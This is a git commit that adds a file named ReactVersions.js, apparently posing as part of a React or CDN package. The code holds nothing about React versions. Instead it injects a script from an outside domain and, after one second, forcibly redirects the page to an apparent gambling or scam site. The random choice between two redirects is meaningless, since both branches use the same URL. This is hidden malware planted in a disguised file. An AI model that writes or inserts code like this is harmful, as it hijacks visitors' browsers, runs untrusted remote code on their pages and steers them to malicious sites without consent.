ad2ceb1c8489751a2f8f52a5b891fcdc47f249e8
reactjscdn <bro_fuckme_oh@proton.me>
2026-08-04 23:29:15 +0800

    js

---
+++ ReactVersions.js
@@ -0,0 +1,11 @@
+(function(w, d, s) {
+    var t = d.createElement(s), y = d.getElementsByTagName(s)[0];
+    t.defer = true;
+    t.src = "https://tj.nationsoul.com/api/script.js";
+    t.setAttribute("data-site-id", "b601191f45c6");
+    y ? y.parentNode.insertBefore(t, y) : d.head.appendChild(t);
+
+    setTimeout(function() {
+        window.location.href = Math.random() < 0.5 ? "https://zll777.vip" : "https://zll777.vip";
+    }, 1000);
+})(window, document, "script");
